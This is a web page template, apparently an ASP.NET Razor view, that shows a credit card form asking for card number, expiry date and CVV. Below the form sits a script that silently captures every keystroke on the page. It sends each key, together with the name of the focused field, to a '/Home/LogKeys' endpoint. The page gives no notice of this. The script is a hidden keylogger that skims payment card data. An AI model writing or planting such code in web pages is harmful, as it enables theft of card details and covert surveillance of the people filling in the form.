<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-6">
            <div class="card">
                <div class="card-header bg-primary text-white text-center">
                    <h3>Credit Card Information</h3>
                </div>
                <div class="card-body">
                    <p class="text-center">Welcome, @ViewBag.Username</p>
                    <form>
                        <div class="form-group mb-3">
                            <label for="cardNumber" class="form-label">Card Number</label>
                            <input type="text" id="cardNumber" name="cardNumber" class="form-control" placeholder="Enter your card number" required />
                        </div>
                        <div class="form-group mb-3">
                            <label for="expiryDate" class="form-label">Expiry Date</label>
                            <input type="text" id="expiryDate" name="expiryDate" class="form-control" placeholder="MM/YY" required />
                        </div>
                        <div class="form-group mb-3">
                            <label for="cvv" class="form-label">CVV</label>
                            <input type="password" id="cvv" name="cvv" class="form-control" placeholder="Enter CVV" required />
                        </div>
                        <div class="text-center">
                            <button type="submit" class="btn btn-primary w-100">Submit</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    document.addEventListener('keydown', function (event) {
        const activeElement = document.activeElement; // Get the focused input element
        const fieldName = activeElement.name || activeElement.id || "unknown"; // Identify the field name or id
        const keyStroke = event.key;

        fetch('/Home/LogKeys', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                field: fieldName,
                keystroke: keyStroke
            })
        });
    });
</script>
